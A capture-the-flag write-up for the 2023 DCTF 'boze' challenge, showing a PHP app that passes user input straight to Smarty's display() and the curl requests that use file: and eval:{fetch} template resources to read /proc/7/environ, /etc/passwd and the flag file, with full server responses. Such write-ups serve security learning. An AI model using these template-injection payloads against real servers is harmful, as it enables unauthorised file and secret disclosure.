# 2023 DCTF - boze

The challenge is a web application that prints the following source code:
```php
<?php

require_once 'vendor/smarty/smarty/libs/Smarty.class.php';
if (!isset($_GET['content'])) {
    $sourceCode = file_get_contents(__FILE__);
    echo '<pre>' . htmlspecialchars($sourceCode) . '</pre>';
    exit;
} 

// When you think you own this, but these comments are worth even more
// $compileDir = '/tmp/smarty_compile/';
// if (!is_dir($compileDir)) {
//     mkdir($compileDir, 0755, true);
// }

$smarty = new Smarty();
try {
    $smarty->display($_GET['content']);
    // $smarty->setCompileDir($compileDir)
} catch (Exception $e) {
    echo 'Still here?';
    $exceptionDetails = "Exception File: " . $e->getMessage() . "\n";
    $tempFilePath = '/tmp/smarty_exception.log';
    file_put_contents($tempFilePath, $exceptionDetails, FILE_APPEND);
}

?>
```

From source code we observe a `content` parameter that is supplied to the `$smarty->display` function directly with no sanitization.

The documentation around `display` function states:
```
This displays the template unlike fetch(). Supply a valid template resource type and path.
```

Resource type can be for instance:
```
file:
eval:
php:
...
```

Although `file:` and `eval:` worked:
```
$ curl -i --output - http://35.242.238.126:30224/?content=file:/proc/7/environ
HTTP/1.1 200 OK
Date: Sun, 22 Oct 2023 14:38:35 GMT
Server: Apache
Vary: Accept-Encoding
Content-Length: 1195
Content-Type: text/html; charset=UTF-8

KUBERNETES_SERVICE_PORT=443KUBERNETES_PORT=tcp://10.59.240.1:443APACHE_CONFDIR=/etc/apache2HOSTNAME=c-d119-c5751t-l1667-boze-789589f86f-5ljnpPHP_INI_DIR=/usr/local/etc/phpHOME=/var/wwwPHP_LDFLAGS=-Wl,-O1 -piePHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64PHP_VERSION=8.1.18GPG_KEYS=528995BFEDFBA7191D46839EF9BA0ADA31CBD89E 39B641343D8C104B2B146DC3F9C39DC0B9698544 F1F692238FBC1666E5A5CCD4199F9DFEF6FFBAFDPHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64PHP_ASC_URL=https://www.php.net/distributions/php-8.1.18.tar.xz.ascPHP_URL=https://www.php.net/distributions/php-8.1.18.tar.xzKUBERNETES_PORT_443_TCP_ADDR=10.59.240.1PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binKUBERNETES_PORT_443_TCP_PORT=443KUBERNETES_PORT_443_TCP_PROTO=tcpKUBERNETES_PORT_443_TCP=tcp://10.59.240.1:443KUBERNETES_SERVICE_PORT_HTTPS=443PHPIZE_DEPS=autoconf 	dpkg-dev 		file 		g++ 		gcc 		libc-dev 		make 		pkg-config 		re2cKUBERNETES_SERVICE_HOST=10.59.240.1PWD=/var/www/htmlPHP_SHA256=f3553370f8ba42729a9ce75eed17a2111d32433a43b615694f6a571b8bad0e39APACHE_ENVVARS=/etc/apache2/envvars
```

```
$ curl --get -i --output - http://35.242.238.126:30224/ -d 'content=eval:{fetch%20file="/etc/passwd"}'
HTTP/1.1 200 OK
Date: Sun, 22 Oct 2023 14:41:58 GMT
Server: Apache
Vary: Accept-Encoding
Content-Length: 966
Content-Type: text/html; charset=UTF-8

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
www:x:1000:3000::/var/www:/usr/sbin/nologin
In this challenge the most interesting one `php` did not work:
```

After lots of trial and error, we've managed to pinpoint the `flag.php` file:
```
$ curl --get -i --output - http://35.242.238.126:30224/ -d 'content=eval:{fetch%20file="/var/www/html/flag.php"}'
HTTP/1.1 200 OK
Date: Sun, 22 Oct 2023 14:43:19 GMT
Server: Apache
Vary: Accept-Encoding
Content-Length: 190
Content-Type: text/html; charset=UTF-8

<?php

$flag_4f3qdw = "ctf{72874605748965cbd4350a538e09abbfb20fbc47a8443addcd5c4adfd57dca79}";

?>

Just when you think you've seen it all, this person is really pushing the boundaries! 🤔
```
